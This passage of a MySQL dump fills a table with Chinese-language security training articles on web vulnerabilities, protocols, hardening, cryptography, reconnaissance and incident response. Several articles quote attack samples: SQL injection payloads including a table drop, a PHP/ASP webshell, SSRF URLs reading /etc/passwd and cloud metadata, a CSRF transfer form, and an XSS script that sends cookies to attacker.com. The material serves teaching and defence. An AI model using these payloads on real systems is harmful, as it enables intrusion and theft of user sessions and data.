/*Table structure for table `knowledge_items` */

DROP TABLE IF EXISTS `knowledge_items`;

CREATE TABLE `knowledge_items` (
  `id` int NOT NULL AUTO_INCREMENT,
  `title` varchar(200) NOT NULL COMMENT '标题',
  `content` text NOT NULL COMMENT '内容',
  `summary` text COMMENT '摘要',
  `category_id` int DEFAULT NULL COMMENT '分类ID',
  `difficulty` enum('easy','medium','hard') DEFAULT 'medium' COMMENT '难度',
  `source` varchar(200) DEFAULT NULL COMMENT '来源',
  `author_id` int DEFAULT NULL COMMENT '作者ID',
  `view_count` int DEFAULT '0' COMMENT '浏览次数',
  `favorite_count` int DEFAULT '0' COMMENT '收藏次数',
  `status` enum('draft','published','archived') DEFAULT 'published' COMMENT '状态',
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `author_id` (`author_id`),
  KEY `idx_knowledge_category` (`category_id`),
  KEY `idx_knowledge_created` (`created_at`),
  FULLTEXT KEY `idx_fulltext` (`title`,`content`),
  CONSTRAINT `knowledge_items_ibfk_1` FOREIGN KEY (`category_id`) REFERENCES `categories` (`id`) ON DELETE SET NULL,
  CONSTRAINT `knowledge_items_ibfk_2` FOREIGN KEY (`author_id`) REFERENCES `users` (`id`) ON DELETE SET NULL
) ENGINE=InnoDB AUTO_INCREMENT=112 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci COMMENT='知识条目表';

/*Data for the table `knowledge_items` */

insert  into `knowledge_items`(`id`,`title`,`content`,`summary`,`category_id`,`difficulty`,`source`,`author_id`,`view_count`,`favorite_count`,`status`,`created_at`,`updated_at`) values (1,'TCP/IP协议体系结构','# TCP/IP协议体系结构\n\n## 四层模型\n\nTCP/IP协议栈采用四层结构，从下往上依次是：\n\n### 1. 链路层（Link Layer）\n负责在物理网络上传输数据帧，包括：\n- **ARP协议**：地址解析协议，将IP地址转换为MAC地址\n- **RARP协议**：反向地址解析协议\n- **以太网**：最常见的局域网技术\n\n### 2. 网络层（Internet Layer）\n负责IP地址寻址和路由：\n- **IP协议**：核心协议，分为IPv4和IPv6\n- **ICMP协议**：互联网控制消息协议，用于诊断和报错\n- **IGMP协议**：组播协议\n\n### 3. 传输层（Transport Layer）\n提供端到端的通信服务：\n- **TCP协议**：面向连接、可靠传输、流量控制\n- **UDP协议**：无连接、高效传输、低延迟\n\n### 4. 应用层（Application Layer）\n为用户提供网络服务：\n- **HTTP/HTTPS**：Web访问\n- **DNS**：域名解析\n- **SMTP/POP3/IMAP**：电子邮件\n- **FTP**：文件传输\n\n## 安全相关知识点\n\n### TCP三次握手与SYN Flood攻击\n1. 客户端发送SYN包\n2. 服务器返回SYN-ACK包\n3. 客户端发送ACK包完成连接\n\n**SYN Flood攻击原理**：攻击者发送大量SYN包但不完成三次握手，导致服务器半开连接耗尽资源。\n\n### DNS安全\n- **DNS欺骗**：攻击者伪造DNS响应\n- **DNS隧道**：利用DNS协议传输隐蔽数据\n- **防护措施**：使用DNSSEC、配置DNS解析安全策略','介绍TCP/IP四层模型及各层主要协议',9,'easy','网络安全基础知识整理',1,3,0,'published','2026-04-01 11:02:43','2026-04-04 13:59:54'),(2,'DNS协议工作原理与安全','# DNS协议工作原理与安全\n\n## DNS系统概述\n\nDNS（Domain Name System）是互联网的核心服务，用于将域名解析为IP地址。\n\n## DNS查询过程\n\n### 递归查询\n客户端发起域名解析请求给本地DNS服务器，本地DNS服务器负责完整查询过程并返回最终结果。\n\n### 迭代查询\nDNS服务器之间采用迭代查询，当本地DNS没有缓存时，会依次查询根域名服务器、顶级域名服务器、权威域名服务器。\n\n## 常见DNS攻击\n\n### 1. DNS缓存投毒\n攻击者向DNS服务器发送伪造的响应，污染DNS缓存，使用户访问恶意站点。\n\n### 2. DNS欺骗\n中间人攻击的一种，拦截DNS查询并返回伪造的IP地址。\n\n### 3. DNS隧道\n利用DNS协议传输数据，绕过网络防火墙。攻击者可以通过DNS查询请求传输恶意代码或数据。\n\n### 4. DDoS攻击\n对DNS服务器发起分布式拒绝服务攻击，导致DNS服务不可用。\n\n## 防护措施\n\n1. **启用DNSSEC**：为DNS响应添加数字签名验证\n2. **限制递归查询**：只对内部网络提供递归服务\n3. **使用可信的DNS服务器**：如8.8.8.8、1.1.1.1\n4. **监控DNS日志**：及时发现异常查询行为\n5. **部署DNS防火墙**：过滤恶意域名和查询','DNS解析过程、常见攻击方式及防护措施',9,'medium','DNS安全分析',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:02:43'),(3,'HTTP/HTTPS协议详解','# HTTP/HTTPS协议详解\n\n## HTTP协议\n\n### HTTP工作原理\nHTTP（HyperText Transfer Protocol）是无状态的请求-响应协议。\n\n### HTTP请求方法\n| 方法 | 说明 | 安全性 |\n|------|------|--------|\n| GET | 获取资源 | 低 |\n| POST | 提交数据 | 中 |\n| PUT | 上传资源 | 低 |\n| DELETE | 删除资源 | 低 |\n| HEAD | 获取头部 | 低 |\n\n### HTTP状态码\n- **1xx**：信息响应\n- **2xx**：成功（200 OK）\n- **3xx**：重定向（301、302）\n- **4xx**：客户端错误（404、403）\n- **5xx**：服务器错误（500、502）\n\n## HTTPS安全机制\n\n### SSL/TLS握手过程\n1. 客户端发送支持的加密算法列表\n2. 服务器选择算法并发送证书\n3. 客户端验证证书有效性\n4. 双方生成会话密钥\n5. 加密通信开始\n\n### HTTPS优势\n- **加密传输**：防止中间人窃听\n- **身份认证**：验证服务器身份\n- **数据完整性**：防止数据篡改\n\n### 常见HTTPS安全问题\n1. **心脏滴血漏洞**：OpenSSL心跳扩展实现缺陷\n2. **SSL Strip攻击**：将HTTPS降级为HTTP\n3. **证书伪造**：使用自签名或伪造证书\n4. **弱加密算法**：使用已破解的加密算法\n\n## 安全建议\n- 强制使用HTTPS\n- 配置HSTS（HTTP严格传输安全）\n- 禁用SSLv2/v3和TLS1.0\n- 使用强加密套件','HTTP协议工作原理及HTTPS安全机制',9,'medium','Web安全基础',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:02:43'),(4,'SQL注入漏洞原理与防御','# SQL注入漏洞原理与防御\n\n## 漏洞原理\n\nSQL注入（SQL Injection）是由于Web应用程序对用户输入数据未做充分验证和转义，导致攻击者可以在SQL语句中插入恶意代码。\n\n## 攻击原理示例\n\n### 正常查询\n```sql\nSELECT * FROM users WHERE username=\'admin\' AND password=\'123456\'\n```\n\n### 注入后\n```sql\nSELECT * FROM users WHERE username=\'admin\'--\' AND password=\'anything\'\n```\n`\'--` 将后面的密码验证注释掉，攻击者无需密码即可登录。\n\n## SQL注入类型\n\n### 1. 基于错误的注入\n通过构造特殊输入引发数据库错误，从错误信息中获取数据库结构。\n\n### 2. 联合查询注入\n使用UNION语句合并恶意查询结果。\n```sql\nSELECT name,email FROM users UNION SELECT username,password FROM admin_users--\n```\n\n### 3. 布尔盲注\n根据页面返回真假判断信息。\n```sql\n\' AND (SELECT COUNT(*) FROM users) > 0 --\n```\n\n### 4. 时间盲注\n利用数据库延时函数判断条件。\n```sql\n\' AND IF(1=1, SLEEP(5), 0) --\n```\n\n### 5. 堆叠查询\n执行多条SQL语句。\n```sql\n\'; DROP TABLE users; --\n```\n\n## 防御措施\n\n### 1. 参数化查询（最佳方案）\n```python\n# 使用预编译语句\ncursor.execute(\"SELECT * FROM users WHERE id = ?\", (user_id,))\n```\n\n### 2. 输入验证\n- 白名单验证\n- 类型检查\n- 长度限制\n- 特殊字符过滤\n\n### 3. 转义处理\n对特殊字符进行转义：\n- 单引号 `\'` → `\'\'`\n- 双引号 `\"` → `\"\"`\n- 反斜杠 `\\` → `\\\\`\n\n### 4. 最小权限原则\n数据库账户只授予必要的权限，避免使用管理员权限连接Web应用。\n\n### 5. 错误处理\n生产环境关闭详细错误信息，使用自定义错误页面。','SQL注入攻击原理、类型及防护方法',10,'medium','OWASP Top 10',1,3,0,'published','2026-04-01 11:02:43','2026-04-04 09:00:59'),(5,'XSS跨站脚本攻击详解','# XSS跨站脚本攻击详解\n\n## 漏洞原理\n\nXSS（Cross-Site Scripting）攻击是指攻击者通过在网页中注入恶意JavaScript代码，当其他用户浏览该网页时，恶意代码会在用户浏览器中执行。\n\n## XSS攻击类型\n\n### 1. 反射型XSS\n恶意脚本作为用户输入的一部分被服务器接收，然后未经转义地返回给用户。\n\n**攻击流程**：\n1. 攻击者构造恶意URL\n2. 用户点击链接访问目标网站\n3. 网站将恶意脚本反射回用户浏览器\n4. 脚本在用户浏览器执行\n\n**示例URL**：\n```\nhttp://example.com/search?q=<script>alert(document.cookie)</script>\n```\n\n### 2. 存储型XSS\n恶意脚本被永久存储在目标服务器（如数据库、评论、论坛帖子），所有访问该数据的用户都会被攻击。\n\n**常见注入点**：\n- 评论区、留言板\n- 用户资料\n- 文章发布\n\n### 3. DOM型XSS\n不涉及服务器处理，纯客户端漏洞。恶意脚本通过操作DOM对象来执行。\n\n**示例代码**：\n```javascript\n// 直接将用户输入插入HTML\ndocument.getElementById(\"output\").innerHTML = location.hash;\n```\n\n## XSS攻击危害\n\n1. **窃取Cookie/Session**：获取用户认证信息\n2. **键盘记录**：监听用户键盘输入\n3. **钓鱼攻击**：修改页面内容欺骗用户\n4. **植入恶意软件**：下载并执行恶意程序\n5. **蠕虫传播**：自动传播XSS攻击\n\n## 防御措施\n\n### 1. 输入验证\n- 白名单验证\n- 限制输入长度\n- 过滤特殊字符\n\n### 2. 输出编码\n| 上下文 | 编码方式 |\n|--------|----------|\n| HTML内容 | `&lt;` `&gt;` `&amp;` |\n| HTML属性 | 使用双引号包裹，编码特殊字符 |\n| JavaScript | JSON编码或十六进制 |\n| URL参数 | URL编码 |\n\n### 3. 设置安全头部\n```http\nContent-Security-Policy: script-src \'self\'\nX-XSS-Protection: 1; mode=block\n```\n\n### 4. HttpOnly Cookie\n设置Cookie的HttpOnly属性，防止JavaScript访问。\n```http\nSet-Cookie: session=xxx; HttpOnly\n```\n\n### 5. 使用现代框架\nReact、Vue等框架默认对输出进行转义。','XSS攻击类型、原理及防护策略',10,'medium','Web应用安全',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:02:43'),(6,'CSRF跨站请求伪造','# CSRF跨站请求伪造\n\n## 漏洞原理\n\nCSRF（Cross-Site Request Forgery）攻击者利用用户已登录的身份，诱导用户访问恶意页面，在用户不知情的情况下以用户身份执行非自愿的操作。\n\n## 攻击原理\n\n### 攻击条件\n1. 用户已登录目标网站\n2. 攻击者知道请求格式和参数\n3. 用户访问恶意页面\n\n### 攻击流程\n1. 用户登录网站A，获取有效Session\n2. 用户访问攻击者构造的恶意页面B\n3. 页面B自动向网站A发送请求（图片、表单、AJAX）\n4. 浏览器自动携带Cookie发送请求\n5. 网站A认为是合法请求，执行相应操作\n\n## 攻击示例\n\n### 图片请求\n```html\n<img src=\"http://bank.com/transfer?to=attacker&amount=10000\">\n```\n\n### 表单请求\n```html\n<form action=\"http://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker\">\n  <input type=\"hidden\" name=\"amount\" value=\"10000\">\n</form>\n<script>document.forms[0].submit();</script>\n```\n\n## 防御措施\n\n### 1. CSRF Token（最佳方案）\n服务器生成随机Token，在表单和Session中各存储一份，提交时验证一致性。\n\n```html\n<form action=\"/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf_token\" value=\"随机Token值\">\n</form>\n```\n\n### 2. 验证请求来源（Referer/Origin）\n检查HTTP头中的Referer或Origin字段。\n\n```python\nif request.headers.get(\'Referer\') != \'https://trusted.com\':\n    return403\n```\n\n### 3. 双重提交Cookie\n将Token同时放在Cookie和请求参数中，服务器验证两者是否匹配。\n\n### 4. 敏感操作验证\n对重要操作要求重新验证（如密码、验证码）。\n\n### 5. SameSite Cookie\n设置Cookie的SameSite属性。\n```http\nSet-Cookie: session=xxx; SameSite=Strict\n```\n\n## 最佳实践\n- 优先使用CSRF Token\n- 敏感操作使用验证码\n- 设置合理的Cookie属性\n- 限制GET请求的操作','CSRF攻击原理与防护方法',10,'medium','Web安全实践',1,5,0,'published','2026-04-01 11:02:43','2026-04-04 13:10:22'),(7,'SSRF服务器端请求伪造','# SSRF服务器端请求伪造\n\n## 漏洞原理\n\nSSRF（Server-Side Request Forgery）攻击者利用Web应用程序的服务器作为代理，向内部系统或外部系统发起请求，从而突破网络边界限制。\n\n## 与CSRF的区别\n\n| 维度 | CSRF | SSRF |\n|------|------|------|\n| 攻击目标 | 用户的操作 | 服务器的操作 |\n| 受害者 | 用户浏览器 | 服务器 |\n| 利用条件 | 用户已登录 | 服务器能访问 |\n\n## 攻击场景\n\n### 1. 访问内部系统\n```\n# 攻击者让服务器访问内部数据库\nhttp://example.com/fetch?url=http://192.168.1.100/admin\n```\n\n### 2. 扫描内网端口\n```\nhttp://example.com/fetch?url=http://192.168.1.1:22\nhttp://example.com/fetch?url=http://192.168.1.1:3306\n```\n\n### 3. 读取本地文件\n```\nhttp://example.com/fetch?url=file:///etc/passwd\n```\n\n### 4. 攻击云服务元数据\n```\nhttp://example.com/fetch?url=http://169.254.169.254/latest/meta-data/\n```\n\n### 5. 探测内部服务\n利用服务器向内部服务发送探测请求，根据响应时间判断服务存在。\n\n## 危害\n\n1. 端口扫描内网主机\n2. 读取本地敏感文件\n3. 攻击内部Web服务\n4. 访问云服务商元数据\n5. 利用Gopher协议攻击Redis、Memcached\n\n## 防御措施\n\n### 1. URL验证\n- 使用URL解析库验证URL\n- 检查host是否为内网IP\n- 禁止访问私有IP地址段\n\n```python\nfrom ipaddress import ip_address, ip_network\n\n# 定义内网IP段\nprivate_networks = [\n    ip_network(\'10.0.0.0/8\'),\n    ip_network(\'172.16.0.0/12\'),\n    ip_network(\'192.168.0.0/16\'),\n    ip_network(\'127.0.0.0/8\')\n]\n\ndef is_private_ip(url):\n    host = urlparse(url).hostname\n    ip = ip_address(host)\n    return any(ip in net for net in private_networks)\n```\n\n### 2. 协议限制\n- 限制允许的协议（http/https）\n- 禁止file://、dict://、gopher://等\n\n### 3. 白名单\n只允许访问预定义的URL列表。\n\n### 4. 禁用不需要的协议\n配置服务器禁止处理file://、dict://等协议。','SSRF漏洞原理、攻击方式及防御',10,'hard','API安全',1,2,0,'published','2026-04-01 11:02:43','2026-04-04 09:07:29'),(8,'文件上传漏洞与防护','# 文件上传漏洞与防护\n\n## 漏洞原理\n\n文件上传功能如果没有正确验证上传文件的类型和内容，攻击者可以上传恶意文件（如WebShell）并在服务器上执行。\n\n## 攻击方式\n\n### 1. WebShell上传\n上传包含恶意代码的文件，获取服务器控制权。\n\n```php\n<?php system($_GET[\'cmd\']); ?>\n```\n\n```asp\n<% eval request(\"cmd\") %>\n```\n\n### 2. 绕过验证\n- **扩展名绕过**：1.php.jpg\n- **大小写绕过**：1.PhP\n- **空格/点绕过**：1.php .\n- **Content-Type欺骗**：修改MIME类型\n- **00截断**：1.php\\x00.jpg\n\n### 3. 配合其他漏洞\n- .htaccess重写绕过\n- .user.ini自动包含\n- 解析漏洞（Apache/nginx）\n\n## 防御措施\n\n### 1. 文件类型验证\n```python\nALLOWED_EXTENSIONS = {\'png\', \'jpg\', \'jpeg\', \'gif\'}\n\ndef allowed_file(filename):\n    return \'.\' in filename and \\\n           filename.rsplit(\'.\', 1)[1].lower() in ALLOWED_EXTENSIONS\n```\n\n### 2. MIME类型验证\n```python\nif file.content_type not in [\'image/png\', \'image/jpeg\']:\n    abort(403)\n```\n\n### 3. 文件内容验证\n```python\n# 读取文件头验证图片类型\ndef verify_image(file):\n    start = file.read(10)\n    file.seek(0)\n    if start[:8] == b\'\\x89PNG\\r\\n\\x1a\\n\':\n        return \'png\'\n    if start[:2] == b\'\\xff\\xd8\':\n        return \'jpeg\'\n    return None\n```\n\n### 4. 存放策略\n- 上传文件存储在Web根目录之外\n- 使用随机文件名\n- 设置只读权限\n- 配置MIME类型映射\n\n### 5. 权限控制\n- 上传目录禁止执行\n- 使用低权限用户运行Web服务\n\n### 6. 图片处理\n对上传图片进行重新生成（压缩、转换格式），破坏恶意代码。','文件上传漏洞原理及安全上传策略',10,'medium','Web应用安全',1,1,0,'published','2026-04-01 11:02:43','2026-04-04 09:00:49'),(9,'Linux系统安全加固','# Linux系统安全加固\n\n## 用户与权限管理\n\n### 1. 最小权限原则\n- 创建专用服务账户\n- 禁止root直接登录\n- 使用sudo提权\n\n### 2. SSH安全配置\n```bash\n# /etc/ssh/sshd_config\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes\nMaxAuthTries 3\n```\n\n## 文件系统安全\n\n### 重要文件权限\n```bash\nchmod 600 /etc/shadow\nchmod 644 /etc/passwd\nchattr +i /etc/passwd\n```\n\n### 挂载选项\n```bash\n/dev/sda1 /boot ext4 defaults,nosuid,nodev,noexec 0 2\n/dev/sda2 /tmp ext4 defaults,nosuid,nodev,noexec 0 2\n```\n\n## 服务与进程安全\n\n### 禁用不必要的服务\n```bash\nsystemctl disable telnet.socket\nsystemctl disable vsftpd\n```\n\n### 网络参数加固\n```bash\n# 防止IP欺骗\necho \"1\" > /proc/sys/net/ipv4/conf/all/rp_filter\n\n# 开启SYN Cookie\necho \"1\" > /proc/sys/net/ipv4/tcp_syncookies\n```\n\n## 日志与审计\n\n配置Auditd监控重要文件：\n```bash\nauditctl -w /etc/passwd -p wa -k identity\nauditctl -w /etc/shadow -p wa -k identity\n```','Linux系统安全加固的常用方法',3,'hard','Linux系统管理',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:24:55'),(10,'Windows系统安全加固','# Windows系统安全加固\n\n## 账户安全\n\n### 管理员账户策略\n- 重命名Administrator账户\n- 设置强密码\n- 创建陷阱管理员账户\n\n### 密码策略\n```\n本地安全策略 → 账户策略 → 密码策略\n- 密码长度最小值: 12\n- 密码必须符合复杂性: 启用\n- 密码最长使用时间: 90天\n```\n\n### 账户锁定策略\n```\n账户锁定阈值: 5次\n账户锁定时间: 30分钟\n```\n\n## 服务安全\n\n### 禁用不必要的服务\n```powershell\nsc config RemoteRegistry start= disabled\nsc config TlntSvr start= disabled\n```\n\n## 网络安全\n\n### 防火墙配置\n```powershell\nSet-NetFirewallProfile -Profile Domain,Public,Private -Enabled True\n```\n\n### SMB安全\n```powershell\nSet-SmbServerConfiguration -EnableSMB1Protocol $false\n```','Windows系统安全加固配置指南',3,'hard','Windows安全',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:24:55'),(11,'对称加密与非对称加密','# 对称加密与非对称加密\n\n## 对称加密\n\n### 原理\n加密和解密使用相同的密钥。\n\n### 常用算法\n\n| 算法 | 密钥长度 | 安全性 |\n|------|----------|--------|\n| AES | 128/192/256位 | 高 |\n| DES | 56位 | 低（已破解） |\n| 3DES | 168位 | 中 |\n\n### 优缺点\n**优点**：速度快、资源消耗低\n**缺点**：密钥分发困难\n\n## 非对称加密\n\n### 原理\n使用公钥和私钥配对进行加密解密。\n\n### 常用算法\n\n| 算法 | 应用 |\n|------|------|\n| RSA | 密钥交换、数字签名 |\n| ECC | 移动端加密 |\n| DH | 密钥交换 |\n\n### 优缺点\n**优点**：密钥分发方便、支持数字签名\n**缺点**：速度慢\n\n## 混合加密\n\n1. 使用非对称加密传输对称密钥\n2. 使用对称加密加密实际数据','两种加密体制的原理、区别与应用场景',4,'medium','密码学基础',1,3,0,'published','2026-04-01 11:02:43','2026-04-04 09:07:34'),(12,'哈希算法与消息认证','# 哈希算法与消息认证\n\n## 哈希函数特性\n\n1. **单向性**：无法从哈希值反推原始数据\n2. **抗碰撞性**：无法找到相同哈希值的不同输入\n3. **固定输出**：无论输入多长，输出长度固定\n4. **雪崩效应**：输入微小变化导致输出巨大差异\n\n## 常用哈希算法\n\n| 算法 | 输出长度 | 安全性 |\n|------|----------|--------|\n| MD5 | 128位 | 不安全 |\n| SHA-1 | 160位 | 不安全 |\n| SHA-256 | 256位 | 安全 |\n| SHA-3 | 可变 | 安全 |\n\n## 密码存储\n\n### 不安全的方式\n```python\n# 错误：明文或简单哈希存储\npassword_hash = md5(password)\n```\n\n### 正确的方式：加盐哈希\n```python\nimport bcrypt\n\ndef hash_password(password):\n    salt = bcrypt.gensalt()\n    return bcrypt.hashpw(password.encode(), salt)\n\ndef verify_password(password, hashed):\n    return bcrypt.checkpw(password.encode(), hashed)\n```\n\n## HMAC\n\n在哈希基础上增加密钥，防止消息被篡改。\n```python\nimport hmac\nmac = hmac.new(key, message, hashlib.sha256).hexdigest()\n```','哈希函数原理及HMAC消息认证',4,'medium','密码学应用',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:24:55'),(13,'数字签名与数字证书','# 数字签名与数字证书\n\n## 数字签名\n\n### 原理\n使用私钥对消息哈希值进行加密，生成签名。\n\n### 常用算法\n- **RSA签名**\n- **DSA**：数字签名算法\n- **ECDSA**：椭圆曲线数字签名算法\n\n## X.509证书结构\n\n```\n证书内容：\n- 版本号\n- 序列号\n- 签名算法\n- 颁发者信息\n- 有效期\n- 主体信息（持有者）\n- 公钥信息\n- 扩展信息\n- 签名值\n```\n\n## 证书颁发机构（CA）\n\n1. **根CA**：自签名，信任起点\n2. **中间CA**：由根CA签发\n3. **终端实体**：服务器/用户证书\n\n## 自签名证书\n\n```bash\n# 创建私钥和证书\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365\n```','数字签名原理及PKI证书体系',4,'hard','PKI体系',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:24:55'),(14,'信息收集技术','# 信息收集技术\n\n## 被动信息收集\n\n### 1. 域名信息收集\n```bash\nwhois example.com\ndig +short example.com A\namass enum -passive -d example.com\n```\n\n### 2. 技术指纹\n```bash\nwhatweb -v example.com\ncurl -I https://example.com\n```\n\n### 3. 网络空间搜索\n- **Shodan**：网络空间搜索引擎\n- **Censys**：证书和主机搜索\n- **FOFA**：国内网络空间测绘\n\n## 主动信息收集\n\n### 端口扫描\n```bash\nnmap -sV -sC -O -p- 1.2.3.4\nnmap -F 1.2.3.4\n```\n\n### Web目录扫描\n```bash\ngobuster dir -u https://example.com -w wordlist.txt\nffuf -w wordlist.txt -u https://example.com/FUZZ\n```\n\n## 收集信息清单\n\n- [ ] 域名和子域名\n- [ ] IP地址范围\n- [ ] DNS记录\n- [ ] 技术栈\n- [ ] 公开漏洞信息','渗透测试前的侦察与信息收集方法',5,'medium','渗透测试指南',1,2,0,'published','2026-04-01 11:02:43','2026-04-04 13:41:10'),(15,'Web漏洞利用与防御','# Web漏洞利用与防御\n\n## OWASP Top 10 (2021)\n\n1. 访问控制失效\n2. 加密失败\n3. 注入\n4. 不安全设计\n5. 安全配置错误\n6. 使用已知漏洞组件\n7. 身份认证失效\n8. 软件和数据完整性失败\n9. 日志和监控不足\n10. 服务端请求伪造\n\n## SQL注入利用\n\n```bash\n# 手动测试\n\' OR \'1\'=\'1\n\' UNION SELECT NULL--\n\n# sqlmap自动利用\nsqlmap -u \"http://target.com/product?id=1\" --batch --dbs\n```\n\n## XSS利用\n\n```html\n<script>alert(document.cookie)</script>\n<script>\nfetch(\'http://attacker.com/steal?c=\' + document.cookie)\n</script>\n```\n\n## 漏洞扫描工具\n\n| 工具 | 特点 |\n|------|------|\n| Burp Suite | Web渗透测试平台 |\n| OWASP ZAP | 开源Web扫描器 |\n| SQLMap | SQL注入检测 |\n| XSStrike | XSS检测 |','常见Web漏洞的利用技术和防护方法',5,'hard','Web渗透测试',1,5,0,'published','2026-04-01 11:02:43','2026-04-04 13:59:45'),(16,'缓冲区溢出漏洞','# 缓冲区溢出漏洞\n\n## 原理\n\n缓冲区溢出是指程序向缓冲区写入的数据超过了其容量，导致相邻内存被覆盖。\n\n## 利用技术\n\n### 栈溢出（Stack Overflow）\n覆盖返回地址，控制程序执行流。\n\n### 堆溢出（Heap Overflow）\n堆管理结构损坏，控制malloc/free。\n\n### 格式化字符串\n```c\nprintf(user_input);  // %s%s%s泄露栈内容\n```\n\n## 防护措施\n\n### 1. 编译器保护\n```bash\ngcc -fstack-protector - Canary值\ngcc -PIE -fpie\n```\n\n### 2. ASLR\n```bash\necho 2 > /proc/sys/kernel/randomize_va_space\n```\n\n### 3. NX/DEP\n硬件层面禁止栈/堆执行代码。\n\n### 4. 安全函数\n```c\n// 不安全\nstrcpy(dst, src);\n\n// 安全替代\nstrncpy(dst, src, size);\n```','缓冲区溢出原理、利用与防护',5,'hard','二进制漏洞',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:24:55'),(17,'应急响应流程','# 应急响应流程\n\n## PDCERF模型\n\n1. **准备阶段（Preparation）**\n2. **检测阶段（Detection & Analysis）**\n3. **遏制阶段（Containment）**\n4. **根除阶段（Eradication）**\n5. **恢复阶段（Recovery）**\n6. **事后阶段（Follow-up）**\n\n## 检测与分析\n\n### 确定事件类型\n- **恶意代码**：病毒、蠕虫、木马\n- **Web攻击**：SQL注入、XSS、webshell\n- **网络攻击**：DDoS、中间人\n- **数据泄露**：拖库、删库\n\n### 收集证据\n```bash\n# 系统日志\n/var/log/auth.log      # SSH登录\n/var/log/secure         # 安全日志\n\n# 网络连接\nnetstat -tunap\n\n# 进程信息\nps aux\n```\n\n## 遏制阶段\n\n### 临时遏制\n- 断网隔离\n- 关闭服务\n- 阻止攻击IP\n- 禁用账户\n\n## 根除阶段\n\n- 清除恶意文件\n- 删除后门账户\n- 修复配置\n- 重建系统（严重时）','安全事件响应的标准流程和方法',6,'hard','应急响应指南',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:24:55'),(18,'恶意软件分析基础','# 恶意软件分析基础\n\n## 分析环境\n\n- 虚拟机隔离（VirtualBox/VMware）\n- 沙箱（Cuckoo、Any.Run）\n- 必备工具（IDA Pro、Ghidra、Wireshark）\n\n## 静态分析\n\n### 文件分析\n```bash\nfile malware.exe\nmd5sum malware.exe\nstrings malware.exe\n```\n\n### PE文件分析\n```bash\ndumpbin /IMPORTS malware.exe\n```\n\n## 动态分析\n\n### 行为监控\n- Process Monitor\n- Process Explorer\n- Wireshark\n\n### 调试分析\n```bash\nx64dbg.exe malware.exe\n```\n\n## 常见恶意软件类型\n\n1. **勒索软件（Ransomware）**\n2. **木马（Trojan）**\n3. **蠕虫（Worm）**\n4. **挖矿软件（Cryptominer）**','恶意软件分析方法和工具',6,'hard','恶意软件分析',1,1,0,'published','2026-04-01 11:02:43','2026-04-04 09:10:50'),(19,'数据加密与脱敏技术','# 数据加密与脱敏技术\n\n## 数据加密\n\n### 透明数据加密（TDE）\n对整个数据库或文件进行加密。\n\n### 列级加密\n```python\nfrom cryptography.fernet import Fernet\nkey = Fernet.generate_key()\ncipher = Fernet(key)\nencrypted = cipher.encrypt(b\"敏感数据\")\n```\n\n## 数据脱敏\n\n### 静态脱敏\n\n| 方法 | 示例 | 用途 |\n|------|------|------|\n| 掩码 | 1234****5678 | 展示 |\n| 替换 | 真实值→假值 | 测试 |\n| 打乱 | 随机排序 | 分析 |\n| 截断 | 138****5678 | 手机号 |\n\n### 手机号脱敏\n```python\ndef mask_phone(phone):\n    if len(phone) == 11:\n        return phone[:3] + \'****\' + phone[-4:]\n    return phone\n```\n\n### 身份证脱敏\n```python\ndef mask_id_card(id_card):\n    if len(id_card) >= 15:\n        return id_card[:6] + \'********\' + id_card[-4:]\n    return id_card\n```\n\n## 隐私保护法规\n\n- **GDPR**：欧盟通用数据保护条例\n- **《个人信息保护法》**：中国个人信息保护法\n- **《数据安全法》**：中国数据安全法','数据保护的各种加密和脱敏方法',7,'medium','数据安全',1,0,0,'published','2026-04-01 11:02:43','2026-04-01 11:25:51'),(20,'TCP/IP协议体系结构','# TCP/IP协议体系结构\n\n## 四层模型\n\nTCP/IP协议栈采用四层结构，从下往上依次是：\n\n### 1. 链路层（Link Layer）\n负责在物理网络上传输数据帧，包括：\n- **ARP协议**：地址解析协议，将IP地址转换为MAC地址\n- **RARP协议**：反向地址解析协议\n- **以太网**：最常见的局域网技术\n\n### 2. 网络层（Internet Layer）\n负责IP地址寻址和路由：\n- **IP协议**：核心协议，分为IPv4和IPv6\n- **ICMP协议**：互联网控制消息协议，用于诊断和报错\n- **IGMP协议**：组播协议\n\n### 3. 传输层（Transport Layer）\n提供端到端的通信服务：\n- **TCP协议**：面向连接、可靠传输、流量控制\n- **UDP协议**：无连接、高效传输、低延迟\n\n### 4. 应用层（Application Layer）\n为用户提供网络服务：\n- **HTTP/HTTPS**：Web访问\n- **DNS**：域名解析\n- **SMTP/POP3/IMAP**：电子邮件\n- **FTP**：文件传输\n\n## 安全相关知识点\n\n### TCP三次握手与SYN Flood攻击\n1. 客户端发送SYN包\n2. 服务器返回SYN-ACK包\n3. 客户端发送ACK包完成连接\n\n**SYN Flood攻击原理**：攻击者发送大量SYN包但不完成三次握手，导致服务器半开连接耗尽资源。\n\n### DNS安全\n- **DNS欺骗**：攻击者伪造DNS响应\n- **DNS隧道**：利用DNS协议传输隐蔽数据\n- **防护措施**：使用DNSSEC、配置DNS解析安全策略','介绍TCP/IP四层模型及各层主要协议',1,'easy','网络安全基础知识整理',1,0,0,'published','2026-04-01 11:09:40','2026-04-01 11:09:40'),(21,'DNS协议工作原理与安全','# DNS协议工作原理与安全\n\n## DNS系统概述\n\nDNS（Domain Name System）是互联网的核心服务，用于将域名解析为IP地址。\n\n## DNS查询过程\n\n### 递归查询\n客户端发起域名解析请求给本地DNS服务器，本地DNS服务器负责完整查询过程并返回最终结果。\n\n### 迭代查询\nDNS服务器之间采用迭代查询，当本地DNS没有缓存时，会依次查询根域名服务器、顶级域名服务器、权威域名服务器。\n\n## 常见DNS攻击\n\n### 1. 